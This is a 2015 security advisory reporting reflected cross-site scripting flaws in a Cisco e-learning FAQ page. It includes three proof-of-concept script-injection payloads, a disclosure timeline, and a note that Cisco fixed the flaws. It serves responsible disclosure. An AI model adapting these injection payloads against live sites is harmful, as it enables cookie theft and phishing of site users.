######################################################################
# Exploit Title: Cisco.com sub-domain Reflected XSS (RXSS)
# Date: 31/10/2015
# Author: Yann CAM @ Synetis - ASafety
# Vendor or Software Link: www.cisco.com
# Version: /
# Category: Reflected Cross Site Scripting
# Google dork:
# Tested on: cisco.com sub-domains
######################################################################

Cisco description :
======================================================================
 
Cisco Systems, Inc. is an American multinational technology company headquartered in San Jose, California, that designs, manufactures, and sells networking equipment.
The stock was added to the Dow Jones Industrial Average on June 8, 2009, and is also included in the S&P 500 Index, the Russell 1000 Index, NASDAQ-100 Index and the 
Russell 1000 Growth Stock Index.

Cisco is the worldwide leader in networking for the Internet. 85 percent of Internet traffic travel across Cisco's systems, and it supports, manages and operates 
business systems for various and major third parties.


Vulnerability description :
======================================================================
Many Cross-Site Scripting vulnerabilities are identified in Cisco sub-domain.
R-XSS are available in the tools.cisco.com sub-domain once authenticated.

Through these vulnerabilities, an attacker could tamper with page rendering, redirect victims to fake Juniper portals, or capture Cisco's users credentials such cookies. 
These vulnerable parameters are not properly sanitized before being used in pages.


Proof of Concept 1 - tools.cisco.com - RXSS :
======================================================================
 
A non-persistent XSS (RXSS) in "list" GET param is available in the Elearning environment of the tools.cisco.com sub-domain.
Tested on Firefox 33.0.3.
 
PoC:
 
http://tools.cisco.com/elearning/faqnet/faq/jsp/faqcontroller.jsp?action=faqList&type=0:1&module=FAQ&appid=12570&rootcatid=12570&resetfaq=1"><script>alert(/Reflected XSS - Yann CAM @ASAfety/);</script><input type="hidden&list=all&type=0:1>


Proof of Concept 2 - tools.cisco.com - RXSS :
======================================================================

A non-persistent XSS (RXSS) in "list" GET param is available in the Elearning environment of the tools.cisco.com sub-domain.
Tested on Firefox 33.0.3.
 
PoC:

http://tools.cisco.com/elearning/faqnet/faq/jsp/faqcontroller.jsp?action=faqList&type=0:1&module=FAQ&appid=12570&rootcatid=12570&resetfaq=1&list=all"><script>alert(/Reflected XSS - Yann CAM @ASAfety/);</script><input type="hidden&type=0:1>


Proof of Concept 3 - tools.cisco.com - RXSS :
======================================================================

A non-persistent XSS (RXSS) in "keyword" POST param is available in the Elearning environment of the tools.cisco.com sub-domain.
Tested on Firefox 33.0.3.
 
PoC:

http://tools.cisco.com/elearning/faqnet/faq/jsp/faqcontroller.jsp
POST DATA :
action=faqAdvanceSearch&appid=12570&module=FAQ&targetID=12570&resetfaq=1&list=all&type=0%3A1&keyword="><script>alert(/Reflected XSS - Yann CAM @ASAfety/);</script><input type="hidden" value="&Submit=Search


Screenshots :
======================================================================

- http://www.asafety.fr/data/20141110-RXSS_Cisco_asafety_001.png
- http://www.asafety.fr/data/20141110-RXSS_Cisco_asafety_002.png
- http://www.asafety.fr/data/20141110-RXSS_Cisco_asafety_003.png
- http://www.asafety.fr/data/20141110-RXSS_Cisco_asafety_004.png
- http://www.asafety.fr/data/20141110-RXSS_Cisco_asafety_005.png


Solution:
======================================================================

Fixed by Cisco Security Team.

 
Additional resources :
======================================================================
 
- https://www.cisco.com
- http://tools.cisco.com
- http://www.asafety.fr/
- http://www.synetis.com

 
Report timeline :
======================================================================
 
2014-11-10 : Cisco PSIRT Team alerted with details and PoC.
2014-11-10 : Cisco PSIRT Team response with thanks and forward the notification to the CSIRT team.
2014-11-12 : Cisco CSIRT Team response with thanks and starts inspection.
2015-03-30 : Vulnerabilities aren't fixed yet. 2nd email to get a status.
2015-03-31 : Cisco CSIRT Team response with an update status.
2015-08-20 : Vulnerabilities fixed.
2015-10-31 : Public article published.


Credits :
======================================================================
 
    88888888
   88      888                                         88    88
  888       88                                         88
  788           Z88      88  88.888888     8888888   888888  88    8888888.
   888888.       88     88   888    Z88   88     88    88    88   88     88
       8888888    88    88   88      88  88       88   88    88   888
            888   88   88    88      88  88888888888   88    88     888888
  88         88    88  8.    88      88  88            88    88          888
  888       ,88     8I88     88      88   88      88   88    88  .88     .88
   ?8888888888.     888      88      88    88888888    8888  88   =88888888
       888.          88
                    88    www.synetis.com
                 8888  Consulting firm in management and information security
 
Yann CAM - Security Consultant @ Synetis | ASafety

--
SYNETIS | ASafety
CONTACT: www.synetis.com | www.asafety.fr
